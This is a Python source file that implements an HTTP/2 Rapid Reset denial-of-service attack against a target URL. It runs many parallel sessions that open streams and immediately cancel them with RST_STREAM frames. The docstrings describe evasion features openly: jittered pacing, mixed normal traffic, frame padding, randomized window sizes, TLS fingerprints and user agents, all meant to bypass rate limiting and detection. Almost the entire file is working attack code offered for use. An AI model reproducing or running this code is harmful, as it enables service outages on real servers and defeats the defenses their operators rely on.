"""
HTTP/2 Rapid Reset with Dynamic Pacing
Implements stream reset attack with anti-detection measures:
- Variable inter-frame delay (jittered)
- Mixed traffic simulation (RST_STREAM + normal completions)
- Frame padding randomization
- Window size variation
"""
import asyncio
import logging
import random
import socket
import ssl
import struct
import time
from typing import Optional, Dict, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("rapid_reset_pacing")

# HTTP/2 Frame types
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_PRIORITY = 0x2
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9

# HTTP/2 Frame flags
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_PADDED = 0x8
FLAG_PRIORITY = 0x20

# HTTP/2 Settings
SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6


class DynamicPacingEngine:
    """
    Dynamic pacing for HTTP/2 Rapid Reset attacks
    Bypasses RST_STREAM rate-limiting by simulating mixed traffic patterns
    
    Optimized for Windows local environment:
    - Reduced concurrency to prevent bandwidth saturation
    - Minimum HTTP/2 frame size (16384) for stable throughput
    """
    
    # HTTP/2 minimum frame size per RFC 7540
    MIN_FRAME_SIZE = 16384
    
    def __init__(self):
        # Pacing parameters (microseconds) - increased delays for low bandwidth
        self.min_inter_frame_us = 500       # 0.5ms minimum (was 0.1ms)
        self.max_inter_frame_us = 10000     # 10ms maximum (was 5ms)
        
        # Mixed traffic ratios
        self.normal_completion_ratio = 0.15
        self.priority_frame_ratio = 0.10
        
        # Window sizes (reduced for limited bandwidth)
        self.window_sizes = [65535, 131072, 262144]
        
    def get_inter_frame_delay(self) -> float:
        """Get jittered inter-frame delay in seconds"""
        base_delay_us = random.uniform(self.min_inter_frame_us, self.max_inter_frame_us)
        jitter_us = random.uniform(-base_delay_us * 0.2, base_delay_us * 0.2)
        delay_us = max(self.min_inter_frame_us, base_delay_us + jitter_us)
        return delay_us / 1_000_000.0
    
    def should_send_normal_completion(self) -> bool:
        return random.random() < self.normal_completion_ratio
    
    def should_send_priority(self) -> bool:
        return random.random() < self.priority_frame_ratio
    
    def get_random_window_size(self) -> int:
        return random.choice(self.window_sizes)
    
    def get_padding_size(self) -> int:
        """Reduced padding range for low bandwidth"""
        return random.randint(0, 64)  # Was 0-255


def encode_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    """Encode HTTP/2 frame"""
    length = len(payload)
    # 24-bit length, 8-bit type, 8-bit flags, 32-bit stream_id
    header = struct.pack(">I", length)[1:] + struct.pack(">BBI", frame_type, flags, stream_id & 0x7FFFFFFF)
    return header + payload


def encode_padded_frame(frame_type: int, flags: int, stream_id: int, 
                       payload: bytes, padding_size: int = 0) -> bytes:
    """Encode HTTP/2 frame with padding for size obfuscation"""
    if padding_size > 0:
        flags |= FLAG_PADDED
        # Pad length byte + padding bytes
        payload = struct.pack("B", padding_size) + payload + (b"\x00" * padding_size)
    return encode_frame(frame_type, flags, stream_id, payload)


def encode_settings_frame(pacing: DynamicPacingEngine) -> bytes:
    """Encode SETTINGS frame with randomized window size and minimum frame size"""
    settings = []
    
    # Random window size (anti-fingerprinting)
    window_size = pacing.get_random_window_size()
    settings.append(struct.pack(">HI", SETTINGS_INITIAL_WINDOW_SIZE, window_size))
    
    # Max concurrent streams (reduced for bandwidth conservation)
    settings.append(struct.pack(">HI", SETTINGS_MAX_CONCURRENT_STREAMS, 100))
    
    # ALWAYS use minimum HTTP/2 frame size (16384)
    # Prevents bandwidth blocking by single large frame
    settings.append(struct.pack(">HI", SETTINGS_MAX_FRAME_SIZE, DynamicPacingEngine.MIN_FRAME_SIZE))
    
    # Header table size (reduced)
    settings.append(struct.pack(">HI", SETTINGS_HEADER_TABLE_SIZE, 4096))
    
    # Enable push (always 0)
    settings.append(struct.pack(">HI", SETTINGS_ENABLE_PUSH, 0))
    
    payload = b"".join(settings)
    return encode_frame(FRAME_SETTINGS, 0, 0, payload)


def encode_rst_stream(stream_id: int, error_code: int = 0x8) -> bytes:
    """Encode RST_STREAM frame (error_code 0x8 = CANCEL)"""
    payload = struct.pack(">I", error_code)
    return encode_frame(FRAME_RST_STREAM, 0, stream_id, payload)


def encode_priority_frame(stream_id: int, depends_on: int = 0, weight: int = 16) -> bytes:
    """Encode PRIORITY frame for traffic simulation"""
    # E flag (1 bit) + Stream Dependency (31 bits) + Weight (8 bits)
    payload = struct.pack(">IB", depends_on & 0x7FFFFFFF, weight)
    return encode_frame(FRAME_PRIORITY, 0, stream_id, payload)


async def send_h2_preface(writer: asyncio.StreamWriter):
    """Send HTTP/2 connection preface"""
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    writer.write(preface)
    await writer.drain()


async def rapid_reset_with_dynamic_pacing(
    target_url: str,
    duration: int,
    rps: int,
    proxy_pool=None,
) -> Dict:
    """
    Execute HTTP/2 Rapid Reset attack with Dynamic Pacing
    Returns metrics dict
    """
    metrics = {
        "completed": 0,
        "failed": 0,
        "timeout": 0,
        "total": 0,
        "rst_streams_sent": 0,
        "normal_completions": 0,
        "priority_frames": 0,
    }
    
    parsed = urlparse(target_url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"
    path = parsed.path or "/"
    
    pacing = DynamicPacingEngine()
    start_time = time.time()
    
    async def attack_session():
        """Single HTTP/2 session with dynamic pacing"""
        session_metrics = {
            "completed": 0, "failed": 0, "timeout": 0, "total": 0,
            "rst_streams_sent": 0, "normal_completions": 0, "priority_frames": 0,
        }
        writer = None
        try:
            # TLS context with ALPN h2
            ssl_ctx = None
            if is_ssl:
                from core.network._tls.fingerprint import get_random_ssl_context
                ssl_ctx, _ = get_random_ssl_context()
                ssl_ctx.set_alpn_protocols(["h2"])
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host if is_ssl else None),
                timeout=10
            )
            
            # Send H2 preface
            await send_h2_preface(writer)
            
            # Send SETTINGS with randomized window size
            settings_frame = encode_settings_frame(pacing)
            writer.write(settings_frame)
            await writer.drain()
            
            stream_id = 1
            session_start = time.time()
            
            while time.time() - session_start < duration and time.time() - start_time < duration:
                try:
                    # Decide frame type with mixed traffic simulation
                    if pacing.should_send_priority():
                        # Insert PRIORITY frame for traffic simulation
                        priority = encode_priority_frame(stream_id, weight=random.randint(1, 256))
                        writer.write(priority)
                        session_metrics["priority_frames"] += 1
                    
                    # Build HEADERS frame with random padding
                    headers_payload = build_h2_headers(host, path)
                    padding = pacing.get_padding_size()
                    headers_frame = encode_padded_frame(
                        FRAME_HEADERS,
                        FLAG_END_HEADERS | FLAG_END_STREAM,
                        stream_id,
                        headers_payload,
                        padding_size=padding
                    )
                    writer.write(headers_frame)
                    
                    # Decide: RST_STREAM or normal completion
                    if pacing.should_send_normal_completion():
                        # Don't reset - let it complete naturally
                        session_metrics["normal_completions"] += 1
                        session_metrics["completed"] += 1
                    else:
                        # Send RST_STREAM (rapid reset)
                        rst_frame = encode_rst_stream(stream_id, error_code=0x8)
                        writer.write(rst_frame)
                        session_metrics["rst_streams_sent"] += 1
                        session_metrics["completed"] += 1
                    
                    session_metrics["total"] += 1
                    
                    # Drain with timeout
                    try:
                        await asyncio.wait_for(writer.drain(), timeout=2)
                    except asyncio.TimeoutError:
                        session_metrics["timeout"] += 1
                        break
                    
                    # Dynamic pacing: variable inter-frame delay
                    delay = pacing.get_inter_frame_delay()
                    await asyncio.sleep(delay)
                    
                    stream_id += 2  # Client streams are odd
                    
                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                    logger.debug(f"H2 connection error: {type(e).__name__}")
                    session_metrics["failed"] += 1
                    break
                except Exception as e:
                    logger.debug(f"H2 stream error: {type(e).__name__}")
                    session_metrics["failed"] += 1
                    session_metrics["total"] += 1
        
        except asyncio.TimeoutError:
            session_metrics["timeout"] += 1
        except Exception as e:
            logger.debug(f"H2 session error: {type(e).__name__}")
            session_metrics["failed"] += 1
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
        
        return session_metrics
    
    # Launch parallel sessions
    num_sessions = min(rps // 100, 50)  # Cap at 50 concurrent sessions
    if num_sessions < 1:
        num_sessions = 1
    
    while time.time() - start_time < duration:
        tasks = [attack_session() for _ in range(num_sessions)]
        try:
            results = await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=min(duration - (time.time() - start_time) + 5, 30)
            )
            for r in results:
                if isinstance(r, dict):
                    for k, v in r.items():
                        metrics[k] = metrics.get(k, 0) + v
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            logger.debug(f"Session batch error: {type(e).__name__}")
        
        # Brief pause between batches
        await asyncio.sleep(0.5)
    
    return metrics


def build_h2_headers(host: str, path: str) -> bytes:
    """
    Build HTTP/2 HEADERS frame payload (simplified HPACK)
    Uses indexed header field representation
    """
    headers = []
    
    # :method GET (indexed: 2)
    headers.append(b"\x82")
    
    # :path / or custom (literal indexing)
    if path == "/":
        headers.append(b"\x84")  # indexed
    else:
        # Literal with incremental indexing - new name (0x40)
        path_bytes = path.encode()
        headers.append(b"\x44")  # :path literal
        headers.append(struct.pack("B", len(path_bytes)) + path_bytes)
    
    # :scheme https (indexed: 7)
    headers.append(b"\x87")
    
    # :authority
    host_bytes = host.encode()
    headers.append(b"\x41")  # :authority literal
    headers.append(struct.pack("B", len(host_bytes)) + host_bytes)
    
    # User-Agent (random)
    from core.network.header_mutation import USER_AGENTS
    ua = random.choice(USER_AGENTS).encode()
    headers.append(b"\x40")
    headers.append(struct.pack("B", 10) + b"user-agent")
    headers.append(struct.pack("B", len(ua)) + ua)
    
    return b"".join(headers)
